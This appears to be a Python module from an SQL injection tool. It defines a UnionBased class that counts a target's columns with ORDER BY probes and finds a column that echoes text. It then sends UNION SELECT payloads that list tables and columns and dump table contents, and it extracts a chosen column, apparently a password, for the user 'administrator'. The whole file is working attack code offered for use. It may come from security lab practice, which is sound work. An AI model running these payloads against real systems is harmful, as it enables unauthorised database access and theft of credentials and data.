from .main import BaseSQLi
from .dbConfig import DB_CONFIG
import re
import html


class UnionBased(BaseSQLi):
    MARKER = "~~~VENOM~~~"

    def __init__(self, url, inject_point, targetTable, db_type="oracle", extra_cookies=None):
        super().__init__(url, targetTable, db_type, inject_point, extra_cookies)
        self.num_columns = None
        self.string_column = None

    def detect_columns(self):
        print("[*] Detecting number of columns...")
        for i in range(1, 21):
            payload = f"' ORDER BY {i}{DB_CONFIG[self.db_type]['comment']}"
            response = self.send(payload)
            if response.status_code == 500 or "error" in response.text.lower():
                self.num_columns = i - 1
                print(f"[+] Columns: {self.num_columns}")
                return self.num_columns
        print("[-] Could not detect column count.")
        return None

    def find_string_column(self):
        if not self.num_columns:
            self.detect_columns()
        print("[*] Finding string-accepting column...")
        for i in range(self.num_columns):
            nulls = ["NULL"] * self.num_columns
            nulls[i] = f"'{self.MARKER}'"
            select = ",".join(nulls)
            from_dual = DB_CONFIG[self.db_type]['from_dual']
            payload = f"' UNION SELECT {select}{from_dual}{DB_CONFIG[self.db_type]['comment']}"
            response = self.send(payload)
            if self.MARKER in response.text:
                self.string_column = i
                print(f"[+] String column: {i}")
                return i
        print("[-] No string column found.")
        return None

    def _build_union(self, expression, from_clause=""):
        nulls = ["NULL"] * self.num_columns
        nulls[self.string_column] = expression
        select = ",".join(nulls)
        if not from_clause:
            from_clause = DB_CONFIG[self.db_type]['from_dual']
        return f"' UNION SELECT {select} {from_clause}{DB_CONFIG[self.db_type]['comment']}"

    def _extract_marked(self, response_text):
        text = html.unescape(response_text)
        pattern = re.escape(self.MARKER) + "(.*?)" + re.escape(self.MARKER)
        matches = re.findall(pattern, text, re.DOTALL)
        return [m.strip() for m in matches if not m.startswith("'") and not m.endswith("'")]

    def dump_tables(self):
        if self.string_column is None:
            self.find_string_column()
        print("[*] Dumping table names...")
        concat = DB_CONFIG[self.db_type]["concat"]
        if self.db_type == "oracle":
            col_expr = f"'{self.MARKER}'||table_name||'{self.MARKER}'"
            payload = self._build_union(col_expr, "FROM all_tables")
        else:
            col_expr = f"'{self.MARKER}'||table_name||'{self.MARKER}'" if concat in ("||", "+") else f"CONCAT('{self.MARKER}',table_name,'{self.MARKER}')"
            payload = self._build_union(col_expr, "FROM information_schema.tables WHERE table_schema!='information_schema' AND table_schema!='pg_catalog'")
        response = self.send(payload)
        tables = self._extract_marked(response.text)
        for t in tables:
            print(f"  [>] {t}")
        return tables

    def dump_columns(self, table_name):
        if self.string_column is None:
            self.find_string_column()
        print(f"[*] Dumping columns for '{table_name}'...")
        concat = DB_CONFIG[self.db_type]["concat"]
        if self.db_type == "oracle":
            col_expr = f"'{self.MARKER}'||column_name||'{self.MARKER}'"
            payload = self._build_union(col_expr, f"FROM all_tab_columns WHERE table_name='{table_name.upper()}'")
        else:
            col_expr = f"'{self.MARKER}'||column_name||'{self.MARKER}'" if concat in ("||", "+") else f"CONCAT('{self.MARKER}',column_name,'{self.MARKER}')"
            payload = self._build_union(col_expr, f"FROM information_schema.columns WHERE table_name='{table_name}'")
        response = self.send(payload)
        columns = self._extract_marked(response.text)
        for c in columns:
            print(f"  [>] {c}")
        return columns

    def dump_data(self, table_name, columns):
        if self.string_column is None:
            self.find_string_column()
        print(f"[*] Dumping data from '{table_name}'...")
        concat = DB_CONFIG[self.db_type]["concat"]
        if concat in ("||", "+"):
            col_expr = f"'{self.MARKER}'{concat}" + f"{concat}'~'{concat}".join(columns) + f"{concat}'{self.MARKER}'"
        else:
            inner = ",".join([f"'~',{c}" for c in columns])[3:]
            col_expr = f"CONCAT('{self.MARKER}',{inner},'{self.MARKER}')"
        payload = self._build_union(col_expr, f"FROM {table_name}")
        response = self.send(payload)
        rows = self._extract_marked(response.text)
        print(f"\n  {'  |  '.join(columns)}")
        print(f"  {'-' * (len(columns) * 20)}")
        for row in rows:
            parts = row.split("~")
            truncated = [p.strip()[:50] + ("..." if len(p.strip()) > 50 else "") for p in parts]
            print(f"  {' | '.join(truncated)}")
        print(f"\n  [+] {len(rows)} rows found.")
        return rows

    def extract(self, column, username='administrator'):
        if self.string_column is None:
            self.find_string_column()
        concat = DB_CONFIG[self.db_type]["concat"]
        if concat in ("||", "+"):
            expr = f"'{self.MARKER}'{concat}(SELECT {column} FROM {self.targetTable} WHERE username='{username}'){concat}'{self.MARKER}'"
        else:
            expr = f"CONCAT('{self.MARKER}',(SELECT {column} FROM {self.targetTable} WHERE username='{username}'),'{self.MARKER}')"
        payload = self._build_union(expr)
        response = self.send(payload)
        results = self._extract_marked(response.text)
        if results:
            print(f"[+] {column}: {results[0]}")
            return results[0]
        print(f"[-] Could not extract {column}.")
        return None
